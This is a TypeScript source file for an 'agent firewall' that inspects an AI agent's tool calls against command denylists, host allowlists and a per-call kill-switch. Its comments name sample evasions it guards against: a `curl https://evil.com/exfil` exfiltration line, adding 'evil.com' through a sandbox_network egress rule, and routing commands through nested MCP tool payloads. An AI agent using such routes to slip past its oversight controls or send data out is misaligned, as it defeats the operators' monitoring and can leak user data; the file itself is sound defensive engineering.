/**
 * Agent Firewall inspection engine.
 *
 * Pure functions that decide whether a tool call should be blocked, plus a
 * small per-thread call counter that backs the hard kill-switch. These are
 * decoupled from the langchain middleware glue so they can be unit-tested in
 * isolation.
 */

import { createLogger } from "../../utils/logger";
import { checkBudget } from "../../utils/token-tracker";
import type { FirewallCheck, FirewallConfig } from "./types";
import { FirewallViolationError } from "./types";

const logger = createLogger("agent-firewall");

/**
 * Argument keys that typically carry a shell/command string. Order is loose:
 * the firewall concatenates every string-valued arg so the rule applies even
 * if a tool uses an unusual key.
 */
const COMMAND_ARG_KEYS = [
  "command",
  "cmd",
  "shell",
  "script",
  "exec",
  "args",
] as const;

/**
 * Argument keys that typically carry a URL / network target.
 */
const URL_ARG_KEYS = ["url", "uri", "endpoint", "host", "fetch_url"] as const;

/**
 * Tool names that are treated as command/shell executors when their arg keys
 * don't match the allowlist above. Anything containing these substrings is
 * considered a shell tool.
 */
const SHELL_TOOL_HINTS = ["shell", "exec", "bash", "run_command", "terminal"];

/**
 * Tool names that are treated as network/fetch tools.
 */
const NETWORK_TOOL_HINTS = [
  "fetch",
  "url",
  "http",
  "curl",
  "wget",
  "request",
  // `sandbox_network` mutates the sandbox egress policy; treat any host it
  // adds as a network target so the firewall allowlist still applies.
  "sandbox_network",
];

/**
 * Tools that proxy execution through a nested MCP/resource layer. Their args
 * carry a nested payload (e.g. `arguments`/`toolArgs`/`uri`) that must be
 * inspected recursively, otherwise an agent can defeat the command/network
 * rules by routing through any MCP server.
 */
const MCP_ROUTING_TOOLS = new Set([
  "call_mcp_tool",
  "read_mcp_resource",
  "list_mcp_resources",
]);

/**
 * Arg keys whose value holds a nested payload for an MCP-routing tool. The
 * firewall recurses into these so command/network inspection sees through the
 * indirection.
 */
const MCP_NESTED_KEYS = ["arguments", "toolArgs", "args", "input", "params"];

/**
 * Arg keys that carry a sandbox-network policy target inside a `rules[]` entry.
 * `sandbox_network({ rules: [{ action: "allow", target: "evil.com" }] })` must
 * be treated as a network target.
 */
const SANDBOX_NETWORK_TARGET_KEY = "target";

/**
 * Maximum depth for nested-args recursion, to bound work on pathological inputs.
 */
const MAX_RECURSION_DEPTH = 5;

/**
 * Collect every string value reachable in a tool-args object, recursing into
 * nested objects and arrays so that indirection layers (e.g. an MCP tool's
 * nested `arguments` payload, or a `rules[]` array of policy entries) cannot
 * hide a command or host from inspection. Returns the list of individual values
 * for URL extraction and the concatenated blob used for regex matching.
 */
function collectStringValues(
  args: Record<string, unknown>,
  depth = 0,
): string[] {
  if (depth > MAX_RECURSION_DEPTH) return [];
  const out: string[] = [];
  for (const key of Object.keys(args)) {
    const val = args[key];
    if (typeof val === "string") {
      out.push(val);
    } else if (typeof val === "number" || typeof val === "boolean") {
      out.push(String(val));
    } else if (Array.isArray(val)) {
      for (const v of val) {
        if (typeof v === "string") {
          out.push(v);
        } else if (
          v !== null &&
          typeof v === "object" &&
          !Array.isArray(v)
        ) {
          // e.g. `rules: [{ action: "allow", target: "evil.com" }]`
          out.push(...collectStringValues(v as Record<string, unknown>, depth + 1));
        } else if (Array.isArray(v)) {
          out.push(...collectStringValues({ i: v }, depth + 1));
        }
      }
    } else if (
      val !== null &&
      typeof val === "object"
    ) {
      // Nested object payload (e.g. MCP toolArgs / arguments).
      out.push(...collectStringValues(val as Record<string, unknown>, depth + 1));
    }
  }
  return out;
}

/**
 * Extract the command blob to inspect. Prefers well-known command arg keys,
 * then recurses into MCP-routing nested payloads, falling back to the
 * concatenation of all string values (which itself recurses).
 */
function extractCommand(
  args: Record<string, unknown>,
): string {
  for (const key of COMMAND_ARG_KEYS) {
    const val = args[key];
    if (typeof val === "string" && val.length > 0) return val;
  }
  // For MCP-routing tools, pull a command string out of the nested payload so
  // an agent cannot defeat the command rules by routing through an MCP server.
  for (const key of MCP_NESTED_KEYS) {
    const nested = args[key];
    if (hasNestedValue(nested)) {
      const inner = nested as Record<string, unknown>;
      for (const ckey of COMMAND_ARG_KEYS) {
        const val = inner[ckey];
        if (typeof val === "string" && val.length > 0) return val;
      }
    }
  }
  return collectStringValues(args).join(" ");
}

/**
 * Extract URL-like targets from args. Prefers well-known url arg keys, then
 * considers `sandbox_network` rule targets, then falls back to scanning all
 * string values (recursively, so nested MCP payloads are covered) for things
 * that parse as URLs or bare hosts.
 */
function extractUrls(args: Record<string, unknown>): string[] {
  const urls: string[] = [];
  for (const key of URL_ARG_KEYS) {
    const val = args[key];
    if (typeof val === "string" && val.length > 0) {
      urls.push(val);
    }
  }
  // `sandbox_network({ rules: [{ action: "allow", target: "evil.com" }] })`
  // — surface each rule target as a network target so the allowlist applies
  // to egress mutations, not just fetches.
  const rules = args["rules"];
  if (Array.isArray(rules)) {
    for (const rule of rules) {
      if (rule && typeof rule === "object") {
        const r = rule as Record<string, unknown>;
        const action = r["action"];
        const target = r[SANDBOX_NETWORK_TARGET_KEY];
        // Only "allow" rules broaden egress; "deny" rules narrow it and need
        // not be checked against the allowlist.
        if (
          action === "allow" &&
          typeof target === "string" &&
          target.length > 0
        ) {
          urls.push(target);
        }
      }
    }
  }
  // Fall back to scanning all string values (recursively) for URL-like content.
  if (urls.length === 0) {
    for (const val of collectStringValues(args)) {
      if (/^https?:\/\//i.test(val)) urls.push(val);
    }
  }
  return urls;
}

/**
 * Convert a host glob (e.g. `*.example.com`, `api.github.com`) into a RegExp.
 * Escapes regex metacharacters except `*`, which becomes `.*`.
 */
export function hostGlobToRegExp(glob: string): RegExp {
  const escaped = glob
    .replace(/[.+?^${}()|[\]\\]/g, "\\$&")
    .replace(/\*/g, ".*");
  return new RegExp(`^${escaped}$`, "i");
}

/**
 * Parse the host out of a URL string. Returns null for values that are neither
 * a URL nor a bare hostname (e.g. free-form text). A bare hostname like
 * `evil.com` (as carried by a `sandbox_network` rule target) is accepted
 * directly so egress mutations cannot bypass the allowlist.
 */
function urlHost(url: string): string | null {
  if (/^https?:\/\//i.test(url)) {
    try {
      return new URL(url).hostname;
    } catch {
      return null;
    }
  }
  // Bare hostname: a dot-delimited label sequence with no spaces/path. This
  // matches sandbox_network targets (e.g. "api.github.com", "*.langfuse.com")
  // without requiring the caller to supply a full URL.
  const trimmed = url.trim();
  if (
    trimmed.length > 0 &&
    !/\s/.test(trimmed) &&
    !/[/?#]/.test(trimmed) &&
    /^[a-z0-9.*-]+(\.[a-z0-9.*-]+)+$/i.test(trimmed)
  ) {
    return trimmed.toLowerCase();
  }
  return null;
}

/**
 * Decide whether a tool is a command/shell tool. True if the name hints at a
 * shell tool, the args contain one of the well-known command keys, or the tool
 * is an MCP-routing tool whose nested payload may carry a command (so the
 * nested `arguments`/`toolArgs` is inspected against the command rules).
 */
export function isCommandTool(
  toolName: string,
  args: Record<string, unknown>,
): boolean {
  const name = toolName.toLowerCase();
  if (SHELL_TOOL_HINTS.some((h) => name.includes(h))) return true;
  if (COMMAND_ARG_KEYS.some((k) => typeof args[k] === "string")) return true;
  // MCP-routing tools can execute commands via their nested payload; classify
  // them as command tools so the nested args are command-inspected.
  if (MCP_ROUTING_TOOLS.has(toolName)) {
    return MCP_NESTED_KEYS.some((k) => hasNestedValue(args[k]));
  }
  return false;
}

/**
 * Decide whether a tool is a network/fetch tool. True if the name hints at a
 * network tool (including `sandbox_network`), the args contain a URL-like
 * value under a known key, or the tool is an MCP-routing tool whose nested
 * payload may carry a URL.
 */
export function isNetworkTool(
  toolName: string,
  args: Record<string, unknown>,
): boolean {
  const name = toolName.toLowerCase();
  if (NETWORK_TOOL_HINTS.some((h) => name.includes(h))) return true;
  if (URL_ARG_KEYS.some((k) => typeof args[k] === "string")) return true;
  // `sandbox_network` broadens egress via rules[].target.
  if (name === "sandbox_network" && Array.isArray(args["rules"])) return true;
  // MCP-routing tools can fetch via their nested payload.
  if (MCP_ROUTING_TOOLS.has(toolName)) {
    return MCP_NESTED_KEYS.some((k) => hasNestedValue(args[k]));
  }
  return false;
}

/**
 * Whether a value is a non-empty nested container (object or array) worth
 * recursing into for command/network inspection.
 */
function hasNestedValue(val: unknown): boolean {
  if (val === null || val === undefined) return false;
  if (Array.isArray(val)) return val.length > 0;
  if (typeof val === "object") return Object.keys(val).length > 0;
  return false;
}

/**
 * Inspect a command/shell tool call against the denylist + allowlist.
 */
export function checkCommand(
  command: string,
  config: FirewallConfig,
): FirewallCheck {
  // Denylist wins: any match blocks regardless of allowlist.
  for (const deny of config.commandDeny) {
    if (deny.test(command)) {
      return {
        block: true,
        rule: "command_denied",
        reason: `Command denied by firewall pattern "${deny.source}": ${command}`,
      };
    }
  }

  // If an allowlist is configured, the command must match at least one entry.
  if (config.commandAllow.length > 0) {
    const allowed = config.commandAllow.some((re) => re.test(command));
    if (!allowed) {
      return {
        block: true,
        rule: "command_denied",
        reason: `Command not on allowlist: ${command}`,
      };
    }
  }

  return { block: false };
}

/**
 * Inspect a network/fetch tool call against the host-glob allowlist.
 */
export function checkNetwork(
  urls: string[],
  config: FirewallConfig,
): FirewallCheck {
  if (config.networkAllow.length === 0) {
    return { block: false };
  }

  const allowRe = config.networkAllow.map(hostGlobToRegExp);

  for (const raw of urls) {
    const host = urlHost(raw);
    if (host === null) {
      // Not a URL — skip. Non-URL args are not network targets.
      continue;
    }
    const allowed = allowRe.some((re) => re.test(host));
    if (!allowed) {
      return {
        block: true,
        rule: "network_denied",
        reason: `Network host not on allowlist: ${host} (from ${raw})`,
      };
    }
  }

  return { block: false };
}

/**
 * Inspect a single tool call against all applicable firewall rules.
 *
 * Command and network checks COMPOSE (logical AND): a command-allowed fetcher
 * (e.g. `curl`) must still respect the network allowlist for any URL it
 * references. This prevents a command-allowlist entry from defeating the
 * network allowlist.
 */
export function inspectToolCall(
  toolName: string,
  args: Record<string, unknown>,
  config: FirewallConfig,
): FirewallCheck {
  if (!config.enabled) return { block: false };

  // Command rules apply to shell tools AND to MCP-routing tools whose nested
  // payload may carry a command.
  if (isCommandTool(toolName, args)) {
    const command = extractCommand(args);
    if (command.length > 0) {
      const result = checkCommand(command, config);
      if (result.block) return result;
    }
  }

  // Network rules apply to fetch tools, sandbox_network egress mutations, AND
  // to command tools (so a command-allowed fetcher still respects egress).
  const networkUrls: string[] = [];
  if (isNetworkTool(toolName, args)) {
    networkUrls.push(...extractUrls(args));
  }
  if (isCommandTool(toolName, args)) {
    // Extract URL-like substrings from the command blob so `curl
    // https://evil.com/exfil` is checked against the network allowlist even
    // though `curl` is command-allowed.
    const command = extractCommand(args);
    if (command.length > 0) {
      networkUrls.push(...extractUrlsFromBlob(command));
    }
  }
  if (networkUrls.length > 0) {
    const result = checkNetwork(networkUrls, config);
    if (result.block) return result;
  }

  return { block: false };
}

/**
 * Pull URL-like substrings out of an arbitrary command blob. Matches
 * `https://...` / `http://...` runs so a command that embeds an egress target
 * is still network-checked.
 */
function extractUrlsFromBlob(blob: string): string[] {
  const out: string[] = [];
  const re = /\bhttps?:\/\/[^\s'"<>)]+/gi;
  let m: RegExpExecArray | null;
  while ((m = re.exec(blob)) !== null) {
    out.push(m[0]);
  }
  return out;
}

// ============================================================================
// Per-thread call counter (hard kill-switch backing store)
// ============================================================================

/**
 * Time-to-live for a per-thread call-count entry. After this many milliseconds
 * without activity the entry is evicted, so a long-running server with many
 * thread ids does not leak memory for the lifetime of the process. Mirrors the
 * `INVOCATION_TTL_MS` pattern in `tool-invocation-limits.ts`.
 */
const THREAD_CALL_COUNT_TTL_MS = Number.parseInt(
  process.env.FIREWALL_CALL_COUNT_TTL_MS || `${60 * 60 * 1000}`, // 1 hour
  10,
);

/**
 * Hard cap on the number of tracked threads. When exceeded the oldest entries
 * are evicted, bounding memory regardless of TTL timing.
 */
const THREAD_CALL_COUNT_MAX_ENTRIES = Number.parseInt(
  process.env.FIREWALL_CALL_COUNT_MAX_THREADS || "10000",
  10,
);

interface ThreadCallCountEntry {
  count: number;
  /** Unix timestamp (ms) of the last increment, used for TTL eviction. */
  lastTouched: number;
}

const threadCallCounts = new Map<string, ThreadCallCountEntry>();

/**
 * Drop entries whose `lastTouched` is older than the TTL. Called
 * probabilistically on increment (mirroring the tool-invocation-limits pattern)
 * so cleanup amortizes across calls without a separate timer.
 *
 * Accepts an explicit `now`/`ttlMs` so tests can drive eviction deterministically
 * without monkey-patching the global clock.
 */
function evictStaleThreadCallCounts(
  now: number = Date.now(),
  ttlMs: number = THREAD_CALL_COUNT_TTL_MS,
): void {
  const cutoff = now - ttlMs;
  for (const [threadId, entry] of threadCallCounts) {
    if (entry.lastTouched < cutoff) {
      threadCallCounts.delete(threadId);
    }
  }
}

/**
 * Enforce the max-entries cap by evicting the oldest entries (the Map iterates
 * in insertion order, so the first entries are the stalest by touch time
 * *approximation* — we re-key on touch via delete+set to keep LRU ordering).
 */
function enforceMaxEntries(): void {
  if (threadCallCounts.size <= THREAD_CALL_COUNT_MAX_ENTRIES) return;
  // Evict ~10% of the cap to amortize the cost across many increments.
  const toEvict = Math.max(
    1,
    Math.floor(THREAD_CALL_COUNT_MAX_ENTRIES * 0.1),
  );
  let evicted = 0;
  for (const threadId of threadCallCounts.keys()) {
    if (evicted >= toEvict) break;
    threadCallCounts.delete(threadId);
    evicted++;
  }
}

/**
 * Get the recorded tool-call count for a thread.
 */
export function getThreadCallCount(threadId: string): number {
  return threadCallCounts.get(threadId)?.count || 0;
}

/**
 * Increment (and return) the per-thread call count. Also opportunistically
 * evicts stale entries so the Map does not grow unbounded for the lifetime of
 * the process.
 */
export function incrementThreadCallCount(threadId: string): number {
  // Probabilistic cleanup (~10% of calls) to amortize cost.
  if (Math.random() < 0.1) {
    evictStaleThreadCallCounts();
  }
  const existing = threadCallCounts.get(threadId);
  const next = (existing?.count || 0) + 1;
  // Re-key on touch so the Map insertion order approximates LRU for the
  // max-entries eviction path.
  threadCallCounts.delete(threadId);
  threadCallCounts.set(threadId, { count: next, lastTouched: Date.now() });
  enforceMaxEntries();
  return next;
}

/**
 * Reset the per-thread call counter (primarily for tests).
 */
export function resetThreadCallCounts(): void {
  threadCallCounts.clear();
}

/**
 * Force eviction of stale entries. Exposed (in addition to the probabilistic
 * cleanup inside {@link incrementThreadCallCount}) so callers and tests can
 * prune deterministically — e.g. wired into a thread-cleanup scheduler when
 * one is available, mirroring `token-tracker.clearTokenUsage`.
 *
 * @param now   Override for the current time (defaults to `Date.now()`).
 * @param ttlMs Override for the TTL window (defaults to the configured TTL).
 */
export function pruneStaleThreadCallCounts(
  now?: number,
  ttlMs?: number,
): void {
  evictStaleThreadCallCounts(now, ttlMs);
}

/**
 * Number of threads currently tracked. Primarily for tests asserting the Map
 * does not grow unbounded.
 */
export function getThreadCallCountSize(): number {
  return threadCallCounts.size;
}

/**
 * Enforce the hard kill-switch for a thread.
 *
 * Combines the per-thread call ceiling with the existing cost/token budget
 * from {@link checkBudget}. On breach, raises a typed
 * {@link FirewallViolationError} so the caller can abort the turn.
 *
 * @param threadId  Thread under inspection.
 * @param config    Firewall config (provides `maxCallsPerThread`).
 * @param estimatedInputTokens  Optional token estimate for the budget check.
 * @param estimatedOutputTokens Optional token estimate for the budget check.
 * @throws {FirewallViolationError} when the ceiling is breached.
 */
export function enforceBudget(
  threadId: string,
  config: FirewallConfig,
  estimatedInputTokens = 0,
  estimatedOutputTokens = 0,
): void {
  // Per-thread call ceiling (hard kill-switch).
  if (config.maxCallsPerThread > 0) {
    const count = getThreadCallCount(threadId);
    if (count >= config.maxCallsPerThread) {
      logger.error(
        { threadId, count, limit: config.maxCallsPerThread },
        "[agent-firewall] Per-thread call budget exceeded — aborting turn",
      );
      throw new FirewallViolationError(
        `Firewall kill-switch: thread ${threadId} exceeded call budget (${count} >= ${config.maxCallsPerThread})`,
        { reason: "budget_exceeded", threadId },
      );
    }
  }

  // Reuse the shared cost/token budget from token-tracker.
  const budget = checkBudget(
    threadId,
    estimatedInputTokens,
    estimatedOutputTokens,
  );
  if (!budget.withinBudget) {
    logger.error(
      { threadId, reason: budget.reason },
      "[agent-firewall] Cost/token budget exceeded — aborting turn",
    );
    throw new FirewallViolationError(
      `Firewall kill-switch: ${budget.reason}`,
      { reason: "budget_exceeded", threadId },
    );
  }
}

/**
 * Clear the recorded call count for a thread (e.g. when a thread is reset).
 */
export function clearThreadCallCount(threadId: string): void {
  threadCallCounts.delete(threadId);
}

/**
 * Re-export the typed error for callers that want to instanceof-check it.
 */
export { FirewallViolationError } from "./types";
